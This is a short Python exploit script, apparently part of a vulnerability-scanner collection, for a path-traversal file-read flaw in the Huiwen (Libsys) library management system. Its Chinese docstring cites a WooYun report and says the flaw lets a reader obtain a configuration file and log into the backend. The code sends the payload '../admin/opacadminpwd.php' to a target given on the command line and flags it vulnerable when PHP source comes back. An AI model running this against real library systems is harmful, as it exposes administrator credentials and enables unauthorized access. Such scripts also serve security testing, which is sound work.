#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 汇文软件图书管理系统ajax_get_file.php任意文件读取
referer: http://www.wooyun.org/bugs/wooyun-2010-0116255
author: Lucifer
description: 漏洞影响5.0版本,漏洞文件位于ajax_get_file.php中,参数filename可以传入"../"来读取配置文件，并成功登陆到后台。'''
import sys
import requests



class libsys_ajax_get_file_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/opac/ajax_get_file.php?filename=../admin/opacadminpwd.php"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)

            if r"<?php" in req.text:
                return "[+]存在汇文图书管理系统文件读取漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = libsys_ajax_get_file_fileread_BaseVerify(sys.argv[1])
    testVuln.run()